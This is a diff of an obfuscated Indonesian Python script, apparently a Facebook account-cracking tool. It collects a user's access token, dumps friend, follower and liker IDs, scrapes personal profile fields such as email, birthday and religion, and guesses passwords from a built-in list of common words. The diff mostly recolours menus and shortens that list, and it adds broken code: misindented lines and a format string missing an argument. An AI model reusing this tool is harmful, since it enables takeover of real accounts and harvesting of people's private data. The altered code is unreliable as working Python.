@@ -104,6 +104,7 @@ def _my_logo_():
     _dapunta_cici_(_logo_line_21)
     _dapunta_cici_(_logo_line_22)
     _dapunta_cici_(_logo_line_23)
+        time.sleep(3)
     
     
     
@@ -177,7 +178,7 @@ def _login_dev_(_Cici_Cantik_Banget_):
     else:pass
     _tok_dev_ = _cici_dapunta_('%s[%s•%s] %sMASUKKAN TOKEN ANJING:\n\n'%(_M_,_P_,_M_,_P_))
     try:
-        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
+        _req_tok_  = _req_get_('%s"https://graph.facebook.com/me?access_token=%s%s'%(_H_,_tok_dev_))
         _js_load_  = _js_lo_(_req_tok_.text)
         _nama_dev_ = _js_load_['name']
         _op_dev_ = _dapunta_dapunta_('token.txt','w')
@@ -233,15 +234,15 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     _dapunta_cici_('%s╔══ %sSELAMAT DATANG %s%s'%(_B_,_O_,_H_,_nama_dev_))
     _dapunta_cici_('%s╠══ %sID Pengguna: %s%s'%(_B_,_O_,_H_,_id_dev_))
     _dapunta_cici_('%s╠══ %sIP Adress  : %s%s'%(_B_,_O_,_H_,_ip_dev_))
-    _dapunta_cici_('%s╚══ %sTanggal    : %s%s\n'%(_K_,_O_,_P_,_tanggal_))
-    _dapunta_cici_('%s──────────────────────────────────────────────────────'%(_K_))
+    _dapunta_cici_('%s╚══ %sTanggal    : %s%s\n'%(_B_,_O_,_P_,_tanggal_))
+    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────────'%(_K_))
     _dapunta_cici_('%s╔══%s[%s1%s] %sCrack ID Dari Teman/Publik'%(_B_,_H_,_P_,_H_,_K_))
     _dapunta_cici_('%s╠══%s[%s2%s] %sCrack ID Dari Pengikut'%(_B_,_H_,_P_,_H_,_K_))
     _dapunta_cici_('%s╠══%s[%s3%s] %sCrack ID Dari Likers'%(_B_,_H_,_P_,_H_,_K_))
-    _dapunta_cici_('%s╠══%s[%s4%s] %sCek Hasil Crack'%(_B_,_H_,_P_,_H_,_K_))
-    _dapunta_cici_('%s╠══%s[%s5%s] %sUser Agent'%(_B_,_H_,_P_,_H_,_K_))
+    _dapunta_cici_('%s╠══%s[%s4%s] %sCek Hasil Crack'%(_B_,_H_,_P_,_H_,_O_))
+    _dapunta_cici_('%s╠══%s[%s5%s] %sUser Agent'%(_B_,_H_,_P_,_H_,_U_))
     _dapunta_cici_('%s╚══%s[%s0%s] %sLog Out'%(_B_,_H_,_P_,_H_,_M_))
-    _dapunta_cici_('%s──────────────────────────────────────────────────────'%(_K_))            
+    _dapunta_cici_('%s──────────────────────────────────────────────────────────────────────────'%(_K_))            
     _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s»»» %sPilih Cok : '%(_B_,_H_))
     _dapunta_cici_('')
     if _dapunta_menu__cici_dapunta__ in ['',' ']:
@@ -271,13 +272,13 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
 ### Dump ID Publik
 def _publik_dev_(_tok_dev_):
     _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
-    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
-    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
+    _dapunta_cici_('%s╔══ %sTulis %s\'me\' %sUntuk Mengambil ID Teman'%(_B_,_P_,_O_,_P_))
+    _target_dev_ = _cici_dapunta_('%s╚══ %sMasukkan ID Target : %s'%(_B_,_P_,_H_))
     try:
         _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
         _jso_tar_ = _js_lo_(_req_tar_.text)
         _name_    = _jso_tar_['name']
-        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
+        _dapunta_cici_('%s╔══ %sNama : %s%s'%(_U_,_O_,_H_,_name_))
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
@@ -386,14 +387,13 @@ def _pass_list_(_cici_):
     _dapunta_.append("sayang")
     _dapunta_.append("bismillah")
     _dapunta_.append("anjing")
-    _dapunta_.append("bangsat")
-    _dapunta_.append("kontol")
-    _dapunta_.append("indonesia")
-    _dapunta_.append("rahasia")
-    _dapunta_.append("katasandi")
-    _dapunta_.append("booyah")
-    _dapunta_.append("garena")
-    _dapunta_.append("moonton")
+
+     _dapunta_.append("kontol")
+
+
+
+
+
     return _dapunta_
 
 ### Logger Crack
@@ -557,7 +557,7 @@ class _crack_dev_:
                 time.sleep(2)
                 _menu_dev_(self._Dapunta_Sayang_Cici_)
     def pwlist(self):
-        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_U_,_P_,_U_,_P_)).split(",")
+        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_B_,_P_,_B_,_P_)).split(",")
         if len(self.pw) ==0:
             _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
             time.sleep(2)
@@ -566,7 +566,7 @@ class _crack_dev_:
             for _suci_salsabila_ in self._files_crack_:
                 _suci_salsabila_.update({"pw":self.pw})
             start_method()
-            put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
+            put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_B_,_P_,_B_,_P_))
             _dapunta_cici_(''%())
             if put in ['']:
                 _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
